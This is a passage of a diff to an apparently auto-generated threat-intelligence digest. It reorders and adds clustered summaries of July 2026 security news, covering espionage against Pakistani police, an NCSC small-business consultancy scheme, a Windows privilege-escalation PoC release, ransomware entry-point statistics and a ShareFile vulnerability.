steps to protect your
-```
-
-#### Corroborating sources (1)
-
-- **NCSC UK** (government_authoritative)
-  - Title: Helping small businesses with free, hands-on cyber consultancy
-  - Published: 2026-07-15T12:00:00+00:00
-  - Link: https://www.ncsc.gov.uk/blogs/helping-small-businesses-with-free-hands-on-cyber-consultancy
-  - Summary: Cyber Advisors are offering free 30-minute consultations to help small businesses get started with cyber security.
-
 ### Cluster f279b0bca6 — score 11
 
 - Title: OkoBot: new sophisticated malware framework targets cryptocurrency users
@@ -1982,6 +1990,49 @@ Threat Research Center Insights Hospitality Hacks and Retail Reality Checks Hosp
   - Link: https://unit42.paloaltonetworks.com/the-gentlemen-ransomware/
   - Summary: Unit 42 explores The Gentlemen ransomware operations, revealing the affiliate model driving its rapid growth. Learn more here. The post No Manners Here: The Ruthless Rise of The Gentlemen Ransomware appeared first on Unit 42 .
 
+### Cluster 4a0789d0ad — score 10
+
+- Title: One Target, Two Flags | Rival Espionage Actors Converge On Pakistani Law Enforcement
+- Source: SentinelOne Labs (threat_research_primary)
+- Published: 2026-07-09T12:55:00+00:00
+- Link: https://www.sentinelone.com/labs/one-target-china-india-espionage-converge-on-pakistani-law-enforcement/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: apt_espionage
+- affected_industries: government
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Primary article taxonomy
+- threat_categories: apt_espionage
+- affected_industries: government
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Summary
+
+```
+China and India ran separate espionage operations against the same Pakistani police force, each drawn by different stakes in Pakistan's internal security.
+```
+
+#### Full body
+
+```
+Adversary One Target, Two Flags | Rival Espionage Actors Converge On Pakistani Law Enforcement Aleksandar Milenkoski & Julian-Ferdinand Vögele / July 9, 2026 Executive Summary SentinelLABS has been tracking sustained cyberespionage activity against several Pakistani law enforcement organizations, taking place from February 2024 to April 2026. All these actors converged on Balochistan Police over this period, bringing both a partner and an adversary of Pakistan to the same police force in a province shaped by a separatist insurgency and the regional tensions it has drawn in. At Balochistan Police, the compromised assets included servers hosting web applications that manage police and citizen data, such as criminal and biometric records. A suspected China-nexus actor planted implants in one of the web applications, which serves both police staff and citizens, weaponizing a tool of Pakistan’s police digitalization against its users. Pakistani law enforcement organizations attract cyber collection because they hold information on Pakistan’s internal security that regional powers have an incentive to pursue. For China, the likely primary concern is the safety of its nationals, the target of repeated deadly attacks Pakistan has failed to prevent, leading Beijing to assess that threat for itself rather than rely on its partner alone. For India, the strongest motive is probably its rivalry with Pakistan, with Balochistan Police offering insight into the security posture of a Pakistani province prominent in wider mutual accusations over cross-border support for militancy. Overview Suspected China- and India-nexus threat actors carried out intrusions into several Pakistani law enforcement organizations between 2024 and 2026. Our analysis of C2 netflow data revealed that suspected China- and India-nexus threat actors operating PlugX, ShadowPad, Cobalt Strike, and Remcos infrastructure have converged on this victim class. All of these threat actors were active against Balochistan Police, the principal police force serving the Pakistani province of the same name, at various points between 2024 and 2026. The affected assets spanned network appliances and servers hosting web applications that manage biometric records, hotel and tenant registrations linked to national identity records, criminal case files, and personnel records. A suspected China-nexus threat actor also compromised one of these web applications, deploying custom implants masquerading as a portal update. The application is used by police staff and by citizens interacting with law enforcement through it, and the compromise put both user groups within the threat actor’s reach. When multiple cyberespionage actors operate against law enforcement institutions of a single state, the convergence itself is a signal of target value. What draws them is a particular kind of institution: one that holds the government’s internal security picture, what it knows about the threats inside its borders, and how it acts against them. Each of the states suspected to be behind the activities covered in this post has its own stake in the threats monitored by Pakistani law enforcement. Strategic Motives | Distrust and Accusations The China-nexus activity is most likely motivated primarily by concern for the safety of Chinese nationals. Their presence across Pakistan is substantial, tied in large part to the China-Pakistan Economic Corridor (CPEC), Beijing’s flagship Belt and Road infrastructure program in the country. Chinese nationals have been the target of repeated deadly attacks, some of which were claimed by the Balochistan Liberation Army (BLA), a Baloch separatist group opposed to China’s presence in the Pakistani resource-rich southwest. Notable attacks include the October 2024 Karachi airport attack and the March 2024 suicide bombing in northwestern Pakistan. The attacks have fueled explicit Chinese dissatisfaction with Pakistani counter-militancy performance. In October 2024, China’s Ambass
+```
+
+#### Corroborating sources (1)
+
+- **SentinelOne Labs** (threat_research_primary)
+  - Title: One Target, Two Flags | Rival Espionage Actors Converge On Pakistani Law Enforcement
+  - Published: 2026-07-09T12:55:00+00:00
+  - Link: https://www.sentinelone.com/labs/one-target-china-india-espionage-converge-on-pakistani-law-enforcement/
+  - Summary: China and India ran separate espionage operations against the same Pakistani police force, each drawn by different stakes in Pakistan's internal security.
+
 ### Cluster b835d1d4b1 — score 10
 
 - Title: GigaWiper: Anatomy of a destructive backdoor assembled from multiple malware
@@ -2029,49 +2080,6 @@ Share Link copied to clipboard! Tags Malware Threats intelligence Cyberattacker 
   - Published: 2026-07-09T15:00:00+00:00
   - Link: https://www.microsoft.com/en-us/security/blog/2026/07/09/gigawiper-anatomy-of-a-destructive-backdoor-assembled-from-multiple-malware/
   - Summary: GigaWiper, also tracked as BLUERABBIT, is a destructive backdoor that combines multiple wiping and ransomware-like capabilities into a single operational platform. This blog analyzes how the malware incorporates code from several previously separate malware families and provides guidance to help defenders detect and defend against similar threats. The post GigaWiper: Anatomy of a destructive backdoor assembled from multiple malware appeared first on Microsoft Security Blog .
-
-### Cluster 4a0789d0ad — score 10
-
-- Title: One Target, Two Flags | Rival Espionage Actors Converge On Pakistani Law Enforcement
-- Source: SentinelOne Labs (threat_research_primary)
-- Published: 2026-07-09T12:55:00+00:00
-- Link: https://www.sentinelone.com/labs/one-target-china-india-espionage-converge-on-pakistani-law-enforcement/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: apt_espionage
-- affected_industries: government
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Primary article taxonomy
-- threat_categories: apt_espionage
-- affected_industries: government
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Summary
-
-```
-China and India ran separate espionage operations against the same Pakistani police force, each drawn by different stakes in Pakistan's internal security.
-```
-
-#### Full body
-
-```
-Adversary One Target, Two Flags | Rival Espionage Actors Converge On Pakistani Law Enforcement Aleksandar Milenkoski & Julian-Ferdinand Vögele / July 9, 2026 Executive Summary SentinelLABS has been tracking sustained cyberespionage activity against several Pakistani law enforcement organizations, taking place from February 2024 to April 2026. All these actors converged on Balochistan Police over this period, bringing both a partner and an adversary of Pakistan to the same police force in a province shaped by a separatist insurgency and the regional tensions it has drawn in. At Balochistan Police, the compromised assets included servers hosting web applications that manage police and citizen data, such as criminal and biometric records. A suspected China-nexus actor planted implants in one of the web applications, which serves both police staff and citizens, weaponizing a tool of Pakistan’s police digitalization against its users. Pakistani law enforcement organizations attract cyber collection because they hold information on Pakistan’s internal security that regional powers have an incentive to pursue. For China, the likely primary concern is the safety of its nationals, the target of repeated deadly attacks Pakistan has failed to prevent, leading Beijing to assess that threat for itself rather than rely on its partner alone. For India, the strongest motive is probably its rivalry with Pakistan, with Balochistan Police offering insight into the security posture of a Pakistani province prominent in wider mutual accusations over cross-border support for militancy. Overview Suspected China- and India-nexus threat actors carried out intrusions into several Pakistani law enforcement organizations between 2024 and 2026. Our analysis of C2 netflow data revealed that suspected China- and India-nexus threat actors operating PlugX, ShadowPad, Cobalt Strike, and Remcos infrastructure have converged on this victim class. All of these threat actors were active against Balochistan Police, the principal police force serving the Pakistani province of the same name, at various points between 2024 and 2026. The affected assets spanned network appliances and servers hosting web applications that manage biometric records, hotel and tenant registrations linked to national identity records, criminal case files, and personnel records. A suspected China-nexus threat actor also compromised one of these web applications, deploying custom implants masquerading as a portal update. The application is used by police staff and by citizens interacting with law enforcement through it, and the compromise put both user groups within the threat actor’s reach. When multiple cyberespionage actors operate against law enforcement institutions of a single state, the convergence itself is a signal of target value. What draws them is a particular kind of institution: one that holds the government’s internal security picture, what it knows about the threats inside its borders, and how it acts against them. Each of the states suspected to be behind the activities covered in this post has its own stake in the threats monitored by Pakistani law enforcement. Strategic Motives | Distrust and Accusations The China-nexus activity is most likely motivated primarily by concern for the safety of Chinese nationals. Their presence across Pakistan is substantial, tied in large part to the China-Pakistan Economic Corridor (CPEC), Beijing’s flagship Belt and Road infrastructure program in the country. Chinese nationals have been the target of repeated deadly attacks, some of which were claimed by the Balochistan Liberation Army (BLA), a Baloch separatist group opposed to China’s presence in the Pakistani resource-rich southwest. Notable attacks include the October 2024 Karachi airport attack and the March 2024 suicide bombing in northwestern Pakistan. The attacks have fueled explicit Chinese dissatisfaction with Pakistani counter-militancy performance. In October 2024, China’s Ambass
-```
-
-#### Corroborating sources (1)
-
-- **SentinelOne Labs** (threat_research_primary)
-  - Title: One Target, Two Flags | Rival Espionage Actors Converge On Pakistani Law Enforcement
-  - Published: 2026-07-09T12:55:00+00:00
-  - Link: https://www.sentinelone.com/labs/one-target-china-india-espionage-converge-on-pakistani-law-enforcement/
-  - Summary: China and India ran separate espionage operations against the same Pakistani police force, each drawn by different stakes in Pakistan's internal security.
 
 ### Cluster 8f654ac030 — score 10
 
@@ -2392,38 +2400,48 @@ FILTER BY YEAR 2026 2025 2024 2023 2022 2021 2020 2019 2018 2017 2016 13th July 
   - Link: https://research.checkpoint.com/2026/13th-july-threat-intelligence-report/
   - Summary: For the latest discoveries in cyber research for the week of 13th July, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES U.S. auto insurer AssuranceAmerica has disclosed a data breach affecting approximately 7 million people. Attackers targeted an employee and used compromised credentials to access company systems, stealing names, contact information, driver’s license […] The post 13th July – Threat Intelligence Report appeared first on Check Point Research .
 
-### Cluster 4d8bcc6f12 — score 10
+### Cluster ab13f77dd3 — score 10
 
-- Title: Recent DShield SIEM Update, (Tue, Jul 14th)
-- Source: SANS Internet Storm Center (government_authoritative)
-- Published: 2026-07-15T01:38:43+00:00
-- Link: https://isc.sans.edu/diary/rss/33156
-- Fetch status: fetch_failed:HTTPError
+- Title: Helping small businesses with free, hands-on cyber consultancy
+- Source: NCSC UK (government_authoritative)
+- Published: 2026-07-15T12:00:00+00:00
+- Link: https://www.ncsc.gov.uk/blogs/helping-small-businesses-with-free-hands-on-cyber-consultancy
+- Fetch status: ok
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: (none)
 
 #### Cluster taxonomy (union across members)
+- threat_categories: ransomware_extortion
+- affected_industries: government
 - content_type: news_report
 - confidence_tier: tier_1_government
 
 #### Primary article taxonomy
+- threat_categories: ransomware_extortion
+- affected_industries: government
 - content_type: news_report
 - confidence_tier: tier_1_government
 
 #### Summary
 
 ```
-The last update to the DShield SIEM [ 4 ] was in Sep 2025 which contained some minor tweaks. This update currently is using ELK stack version 8.19.15, contains some additional dashboards and new logs.
+Cyber Advisors are offering free 30-minute consultations to help small businesses get started with cyber security.
+```
+
+#### Full body
+
+```
+Blog Post Download & print article PDF Download & print article PDF Helping small businesses with free, hands-on cyber consultancy Cyber Advisors are offering free 30-minute consultations to help small businesses get started with cyber security. Emma W Composite created from images courtesy of IASME If you’re a small business, cyber attacks may feel like something that only large companies need to worry about. Companies with bigger budgets, more customers – and more to lose. And since you’re focused on keeping customers happy, managing cashflow and your day-to-day business, investing in cyber security can seem more like a costly distraction than a priority. The reality is that smaller businesses are frequently targeted, precisely because they’re less likely to have cyber protections in place. In other words, no business is too small to be a victim of cyber crime. In fact, in 2025, 65% of medium and 46% of small organisations reported a cyber breach or attack . We also know from our own research that many smaller organisations believe that cyber security is too complicated, too expensive, and doesn’t address the real-world risks that small businesses face. To help address this, we introduced Cyber Advisors in 2023, a network of cyber security consultants who’ve been assured by the NCSC to work specifically with smaller organisations. Cyber Advisors aren’t just technical specialists; they understand how to apply the advice from the experts at the NCSC in a way that’s practical, realistic and relevant for smaller businesses . Free, 30-minute consultations For smaller organisations with limited in-house expertise, knowing where to start can often feel like the biggest hurdle. So many Cyber Advisors are now offering a free 30-minute consultation for small or medium-sized business (SMEs) who are looking to get started with Cyber Essentials , the government's baseline for cyber security. This no-strings-attached, introductory consultation can make all the difference, providing you with an opportunity to ask questions and demystify what can sometimes feel like a complex area. Since the option of a free consultation was introduced, over 760 small organisations across the UK have reached out to us. This has already led to well over 150 small organisations successfully gaining Cyber Essentials certification through this route alone, with more well underway. If you decide to use a Cyber Advisor, you will benefit from expert insights that explain how the 5 steps that make up Cyber Essentials can be applied to your organisation using practical, achievable steps. Whether it’s understanding security controls, identifying quick wins or avoiding common pitfalls, the consultation will help your organisation move forward with confidence. Other free cyber tools from the NCSC Cyber Advisors can also help you with other free tools from the NCSC. The Early Warning service, for example, warns you about potential viruses and vulnerabilities on your network, so you can act on them before they become bigger problems. If you employ a Cyber Advisor, they will also be able to help set up Early Warning, and use the alerts you’ll receive to improve your cyber security. The NCSC’s Cyber Action Toolkit gives you a practical starting point for building cyber resilience and a pathway towards Cyber Essentials certification. Another tool, the NCSC’s free Cyber Action Toolkit , is a new way of providing advice in a way that engages small businesses, and more importantly, encourages you to take action . As you work through the toolkit, you’ll build layers of protection around your organisation which defends against common cyber threats such as email hacking, data breaches and ransomware. Ultimately, initiatives like these demonstrate that cyber security is within reach for organisations of all sizes, working across all sectors. With the right support, small businesses don’t need to tackle cyber security alone. You can confidently take practical steps to protect your
 ```
 
 #### Corroborating sources (1)
 
-- **SANS Internet Storm Center** (government_authoritative)
-  - Title: Recent DShield SIEM Update, (Tue, Jul 14th)
-  - Published: 2026-07-15T01:38:43+00:00
-  - Link: https://isc.sans.edu/diary/rss/33156
-  - Summary: The last update to the DShield SIEM [ 4 ] was in Sep 2025 which contained some minor tweaks. This update currently is using ELK stack version 8.19.15, contains some additional dashboards and new logs.
+- **NCSC UK** (government_authoritative)
+  - Title: Helping small businesses with free, hands-on cyber consultancy
+  - Published: 2026-07-15T12:00:00+00:00
+  - Link: https://www.ncsc.gov.uk/blogs/helping-small-businesses-with-free-hands-on-cyber-consultancy
+  - Summary: Cyber Advisors are offering free 30-minute consultations to help small businesses get started with cyber security.
 
 ### Cluster cf7aa5bc3e — score 10
 
@@ -2471,6 +2489,39 @@ ESET Research Forgotten UEFI shims undermining Secure Boot ESET researchers disc
   - Published: 2026-07-14T08:53:00+00:00
   - Link: https://www.welivesecurity.com/en/eset-research/forgotten-uefi-shims-undermining-secure-boot/
   - Summary: ESET researchers discovered 11 vulnerable UEFI shim bootloaders signed by Microsoft that allow attackers to bypass UEFI Secure Boot by exploiting decade-old vulnerabilities
+
+### Cluster 4d8bcc6f12 — score 10
+
+- Title: Recent DShield SIEM Update, (Tue, Jul 14th)
+- Source: SANS Internet Storm Center (government_authoritative)
+- Published: 2026-07-15T01:38:43+00:00
+- Link: https://isc.sans.edu/diary/rss/33156
+- Fetch status: fetch_failed:HTTPError
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- content_type: news_report
+- confidence_tier: tier_1_government
+
+#### Primary article taxonomy
+- content_type: news_report
+- confidence_tier: tier_1_government
+
+#### Summary
+
+```
+The last update to the DShield SIEM [ 4 ] was in Sep 2025 which contained some minor tweaks. This update currently is using ELK stack version 8.19.15, contains some additional dashboards and new logs.
+```
+
+#### Corroborating sources (1)
+
+- **SANS Internet Storm Center** (government_authoritative)
+  - Title: Recent DShield SIEM Update, (Tue, Jul 14th)
+  - Published: 2026-07-15T01:38:43+00:00
+  - Link: https://isc.sans.edu/diary/rss/33156
+  - Summary: The last update to the DShield SIEM [ 4 ] was in Sep 2025 which contained some minor tweaks. This update currently is using ELK stack version 8.19.15, contains some additional dashboards and new logs.
 
 ### Cluster b04e6fdd89 — score 10
 
@@ -2685,55 +2736,6 @@ Back to Blog Culture Rapid7 and Mindshare Partner to Accelerate Cyber Resilience
   - Link: https://www.rapid7.com/blog/post/c-rapid7-mindware-middle-east-cybersecurity-partnership
   - Summary: Gopan Sivasankaran is Regional Director, Middle East & Africa, at Rapid7 From AI adoption and cloud-first strategies to smart cities and critical infrastructure modernization, organizations across the United Arab Emirates are embracing innovation at an unprecedented rate. The country truly is setting the pace for digital transformation. Against this backdrop of rapid innovation, today's security teams are managing increasingly complex environments while defending against more sophisticated, AI-enabled threats. In this environment, business leaders still expect security to enable innovation, not slow it down. They're pushed to reduce risk, improve visibility across expanding attack surfaces, and respond faster than ever before, with limited resources now table stakes. This shift is changing what organizations expect from their cybersecurity partners, with customers no longer wanting disconnected tools or transactional relationships. They’re instead craving trusted advisors who can help
 
-### Cluster 3ab4666a65 — score 10
-
-- Title: Researcher Drops New Windows Zero-Day PoC Hours After Microsoft Patch Tuesday
-- Source: The Hacker News (cyber_news_breach_reporting)
-- Published: 2026-07-15T11:07:07+00:00
-- Link: https://thehackernews.com/2026/07/researcher-drops-new-windows-zero-day.html
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: active_exploitation, zero_day
-- affected_industries: government
-- affected_products: Microsoft Defender, Microsoft SharePoint
-- cve_ids: CVE-2026-32201, CVE-2026-45659, CVE-2026-56155, CVE-2026-56164
-- urgency_signals: actively_exploited, poc_available, zero_day
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- threat_categories: zero_day, active_exploitation
-- affected_industries: government
-- affected_products: Microsoft Defender, Microsoft SharePoint
-- cve_ids: CVE-2026-56164, CVE-2026-56155, CVE-2026-32201, CVE-2026-45659
-- urgency_signals: actively_exploited, zero_day, poc_available
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-Security researcher Chaotic Eclipse (aka Nightmare-Eclipse) has released a new proof-of-concept (PoC) exploit called LegacyHive. It has been described as a Windows User Profile Service arbitrary hive load elevation of privileges vulnerability. The Windows User Profile Service, also referred to as ProfSvc, is a core system component that manages user accounts and environments. "The PoC requires
-```
-
-#### Full body
-
-```
-Researcher Drops New Windows Zero-Day PoC Hours After Microsoft Patch Tuesday  Ravie Lakshmanan  Jul 15, 2026 Vulnerability / Enterprise Security Security researcher Chaotic Eclipse (aka Nightmare-Eclipse ) has released a new proof-of-concept (PoC) exploit called LegacyHive. It has been described as a Windows User Profile Service arbitrary hive load elevation of privileges vulnerability. The Windows User Profile Service, also referred to as ProfSvc, is a core system component that manages user accounts and environments. "The PoC requires another standard user credential and a third username (which can be an administrator account)," Chaotic Eclipse said . "If the PoC is successful, it will end up mounting the target user hive in the current user classes root." The researcher said the exploit was stripped down to prevent public exploitation, adding the original exploit did not require additional user credentials and was not limited to the "usrclass.dat" hive. "Any hive could be loaded using this vulnerability, but you would need some brain cells to make the PoC do it," the researcher noted. What makes it notable is that it's functional on all supported desktop and server versions of Windows, including those running the latest July 2026 Patch Tuesday update. Chaotic Eclipse and Microsoft have been locked in a heated dispute since at least April 2026, with the researcher releasing details of multiple exploits before the Windows maker had a chance to patch them, citing a breakdown in communication. Three of the vulnerabilities in Microsoft Defender came under active exploitation shortly after public disclosure. Earlier this month, the tech giant released security updates for another Defender vulnerability known as RoguePlanet that was disclosed by the researcher. However, it emerged that the newly introduced "defense-in-depth updates" to address the flaw can cause Microsoft Defender to leak 8 bytes of data when attempting to open a file in certain scenarios. Microsoft told The Hacker News that it's investigating the new report. We have contacted the company for comment regarding LegacyHive, and we will update the story if we hear back. SharePoint Server Flaws in Spotlight The development comes as Microsoft shipped patches for a record 622 flaws , including two privilege escalation shortcomings in SharePoint Server (CVE-2026-56164, CVSS score: 5.3) and Active Directory Federation Services (CVE-2026-56155, CVSS score: 7.8) that have been flagged as actively exploited. The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has added both vulnerabilities to its Known Exploited Vulnerabilities ( KEV ) catalog, which mandates that Federal Civilian Executive Branch (FCEB) agencies apply the fixes by July 17 and July 28, 2026, respectively. "After years of relative stability, the Patch Tuesday process has experienced significant turbulence so far in 2026," Adam Barnett, lead software engineer at Rapid7, said in a statement. "As well as the AI-fuelled exponential growth of vulnerability reporting and discovery, Microsoft is grappling with the emergence of a series of vulnerabilities disclosed in such a way as to bring maximum discomfort for Redmond." In a separate advisory, the agency said it's aware of active exploitation of multiple SharePoint Server flaws, including CVE-2026-32201 , CVE-2026-45659 , and CVE-2026-56164, that enable cyber threat actors to gain unauthorized access to susceptible instances. "These vulnerabilities affect all supported on-premises SharePoint Server versions (Subscription Edition, 2019, and 2016) and involve establishing remote code execution (RCE) and post-exploitation activities, such as stealing Internet Information Services (IIS) machine keys and performing deserialization techniques, to gain persistence and deploy malware," CISA said. "The flaw stems from missing authentication for a critical function, enabling an attacker to reach functionality that should require authorization," Alex Vovk, CE
-```
-
-#### Corroborating sources (1)
-
-- **The Hacker News** (cyber_news_breach_reporting)
-  - Title: Researcher Drops New Windows Zero-Day PoC Hours After Microsoft Patch Tuesday
-  - Published: 2026-07-15T11:07:07+00:00
-  - Link: https://thehackernews.com/2026/07/researcher-drops-new-windows-zero-day.html
-  - Summary: Security researcher Chaotic Eclipse (aka Nightmare-Eclipse) has released a new proof-of-concept (PoC) exploit called LegacyHive. It has been described as a Windows User Profile Service arbitrary hive load elevation of privileges vulnerability. The Windows User Profile Service, also referred to as ProfSvc, is a core system component that manages user accounts and environments. "The PoC requires
-
 ### Cluster aa4a893323 — score 10
 
 - Title: Unpatched XRING Flaw in XQUIC Lets Remote Clients Crash HTTP/3 Servers
@@ -2780,94 +2782,6 @@ Unpatched XRING Flaw in XQUIC Lets Remote Clients Crash HTTP/3 Servers  Swati
   - Published: 2026-07-10T11:47:43+00:00
   - Link: https://thehackernews.com/2026/07/unpatched-xring-flaw-in-xquic-lets.html
   - Summary: A single wrong variable on one line in XQUIC, Alibaba's QUIC and HTTP/3 library, lets any remote client crash the server with a short burst of completely legal traffic. There is no patch. FoxIO researcher Sébastien Féry disclosed the flaw on July 8 and nicknamed it XRING. He says it needs no login and no malformed packets: about 260 bytes of ordinary QPACK traffic takes the server
-
-### Cluster 5b3297c4f5 — score 10
-
-- Title: Compromised Logins Surge as the Most Common Entry Point for Ransomware Attacks
-- Source: Infosecurity Magazine (cyber_news_breach_reporting)
-- Published: 2026-07-15T12:45:00+00:00
-- Link: https://www.infosecurity-magazine.com/news/compromised-logins-ransomware-entry/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: phishing_social_eng, ransomware_extortion
-- content_type: incident_report
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- threat_categories: ransomware_extortion, phishing_social_eng
-- content_type: incident_report
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-Research of incidents by Sophos finds that phishing, brute force attacks and other identity-based threats have surpassed software vulnerabilities as means of delivering ransomware
-```
-
-#### Full body
-
-```
-Infosecurity Magazine Home » News » Compromised Logins Surge as the Most Common Entry Point for Ransomware Attacks Compromised Logins Surge as the Most Common Entry Point for Ransomware Attacks News 15 July 2026 Written by Danny Palmer Deputy Editor , Infosecurity Magazine Identity-based attacks and abuse of compromised credentials have become the most common method cybercriminals use to hit networks with ransomware, analysis of real-world incidents has revealed. According to a new report by Sophos, 79% of ransomware attacks can be traced back to an initial intrusion which exploited compromised identities and legitimate user logins. In total, malicious emails accounted for the initial entry point for ransomware in 26% of analyzed incidents, up from 19% in 2025. Phishing attacks , often used to steal legitimate login credentials, were the root cause of ransomware attacks in 24% of incidents, which is up from 18% during the previous year. The third most common entry point for ransomware incidents was brute force attacks , a method which sees cybercriminals use automation and trial and error to breach commonly used or weak passwords . This accounted for 23% of ransomware attacks, a slight drop from 22% during the previous year. Identity-based attacks have risen at the expense of vulnerabilities being exploited. Previously, the most common root cause of ransomware incidents, the percentage of attacks which started with attackers exploiting known security vulnerabilities dropped from 32% in 2025 to 18% in 2026. "Over the last 12 months across the ransomware landscape we’ve seen attackers rely on ‘easier’ attacks, using compromised identities as the primary initial access vector. Not to mention the developments in social engineering, with AI routinely deployed to polish phishing emails and sophisticated ClickFix campaigns designed to trick even the most trained users into bypassing MFA. This years trend shows they are focused on targeting humans," Ross McKerchar, CISO at Sophos told Infosecurity . Attackers are leveraging the exploited identities in several different ways, using them to access exposed applications or systems (38%), remote device logins (30%) and firewalls (21%) as well as exposed VPNs (8%) and in some cases, IoT devices as the initial point of entry (3%). There is not one factor that left organizations exposed to attacks, but there are some common trends. According to the 2158 cybersecurity leaders surveyed by Sophos, 62% cited security gaps in the network , both known and unknown as a potential reason for cyber-attacks going undetected. Over half (58%) said their organization was held back by resources around a lack of people or appropriate expertise to keep the organization safe from cyber threats. Meanwhile, 57% of respondents said that they felt that their organization had not implemented the correct level of cybersecurity solutions or protections to keep the network or users safe. Recovering From a Ransomware Attack For those organizations which fell victim to a ransomware attack to the extent data was encrypted, 48% said that they paid the ransom to get data back. In addition to this, 66% said they used their own backups to restore some of the encrypted data, up from 54% in 2025. When it came to ransom demands, the report said that the median ransom demand has fallen to $698,000 in this year’s report, down from $2m just two years ago. However, the large organizations continue to receive much higher ransom demand, amounting to millions of dollars. While it might look as if ransom payments are getting lower, what is really happening is that cybercriminals are tailoring their ransom demands to the organizations they hit, demanding less from smaller organizations. That’s simply because if they went in with a ransom demand that was too high, the organization would refuse to pay. However, if the ransom demand is more ‘reasonable’ it can push the victim to pay up for the decryption key, especially if they believe tha
-```
-
-#### Corroborating sources (1)
-
-- **Infosecurity Magazine** (cyber_news_breach_reporting)
-  - Title: Compromised Logins Surge as the Most Common Entry Point for Ransomware Attacks
-  - Published: 2026-07-15T12:45:00+00:00
-  - Link: https://www.infosecurity-magazine.com/news/compromised-logins-ransomware-entry/
-  - Summary: Research of incidents by Sophos finds that phishing, brute force attacks and other identity-based threats have surpassed software vulnerabilities as means of delivering ransomware
-
-### Cluster 9097ac0c9e — score 10
-
-- Title: Progress Restores ShareFile Storage Zones Access After Vulnerability Exploit Concerns
-- Source: Infosecurity Magazine (cyber_news_breach_reporting)
-- Published: 2026-07-15T12:00:00+00:00
-- Link: https://www.infosecurity-magazine.com/news/progress-restores-sharefile/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: data_breach, ransomware_extortion, zero_day
-- affected_industries: education, financial_services, government
-- affected_products: Apple iOS/macOS, Google Cloud, Ivanti
-- urgency_signals: no_patch_yet, zero_day
-- content_type: vulnerability_disclosure
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- threat_categories: ransomware_extortion, zero_day, data_breach
-- affected_industries: financial_services, government, education
-- affected_products: Ivanti, Apple iOS/macOS, Google Cloud
-- urgency_signals: zero_day, no_patch_yet
-- content_type: vulnerability_disclosure
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-Progress has restored access to its ShareFile Storage Zones Controller after a four-day suspension triggered by a credible external security threat
-```
-
-#### Full body
-
-```
-Infosecurity Magazine Home » News » Progress Restores ShareFile Storage Zones Access After Vulnerability Exploit Concerns Progress Restores ShareFile Storage Zones Access After Vulnerability Exploit Concerns News 15 July 2026 Written by Kevin Poireault Reporter , Infosecurity Magazine Follow @Kpoireault Connect on LinkedIn After a four-day security suspension, Progress has restored access to its ShareFile Storage Zones Controller. ShareFile is Progress’ flagship enterprise file-sharing service and Storage Zones Controller provides ShareFile customers with private data storage. Progress Software detected “ a credible external security threat ” on July 10 that prompted the company to temporarily suspend the service. The service was resumed on July 14. The company confirmed to Infosecurity that the incident was the result of the exploitation of a high severity path traversal vulnerability affecting Storage Zones Controller versions 5.x and 6.x. “We developed and released patched versions to customers and once patched, these customers’ Storage Zones Controllers will be operational,” the company told Infosecurity . The latest version of Storage Zones Controller that includes the patch for this vulnerability are 5.12.5 and 6.0.2. However, Progress did not disclose the common vulnerabilities and exposures (CVE) identifier. The company told BleepingComputer it is waiting to publish the CVE in order to give customers time to patch before details become public and available to potential threat actors. “At this time, we have no evidence of unauthorized access to any ShareFile customer account or data, and we have not identified any active threat,” they told Infosecurity . Progress has a history of security incidents, including the 2023 breach of its MOVEit Transfer product which was exploited in widespread ransomware attacks. A critical vulnerability in MOVEit Automation was was reported in April 2026 that led to further disruptions. Image credit: Piotr Swat / Shutterstock.com You may also like Hackers Target Unpatched Flaws in Oracle E-Business Suite News 3 October 2025 Citrix Patches Three NetScaler Zero Days as One Sees Active Exploitation News 27 August 2025 Ivanti Vulnerability Exploit Could Expose UK NHS Data News 28 May 2025 Patching and Policy Lessons Learned from WannaCry Blog 3 October 2018 Researcher Behind 'Exploitarium' Explains Release of Undisclosed Zero-Day Exploits News 2 July 2026 What’s Hot on Infosecurity Magazine? Read Shared Watched Editor's Choice US: Pentagon Suspends CMMC Phase II Requirements for Defense Contractors News 14 July 2026 1 Progress Software Warns of "External Security Threat" to ShareFile News 13 July 2026 2 Hacker Extradited from Ukraine Pleads Guilty to Ryuk Ransomware Charges News 13 July 2026 3 Researchers Claim First Fully Agentic Ransomware: JadePuffer News 6 July 2026 4 New MacOS Malware Exploits Legitimate Developer ID to Pose as Apple Crash Reporter News 14 July 2026 5 Lidl Notifies Customers of Third-Party Data Breach News 14 July 2026 6 Google Cloud's New CISO Chris Betz on Integrating AI in Cyber Defenses Interview 7 July 2026 1 How Faster Cyber-Attacks Are Reshaping Enterprise Cybersecurity Strategies News Feature 8 July 2026 2 Suspected Chinese Threat Group Targets Universities via Vulnerable Roundcube Servers News 7 July 2026 3 Researchers Claim First Fully Agentic Ransomware: JadePuffer News 6 July 2026 4 UK Government Launches Cyber Resilience Pledge, Claiming 60+ Signatories News 7 July 2026 5 GhostApproval Flaw Hits Six Major AI Coding Assistants News 9 July 2026 6 Financial Services Cyber Resilience: Stress Testing Third Parties Before Attackers Do 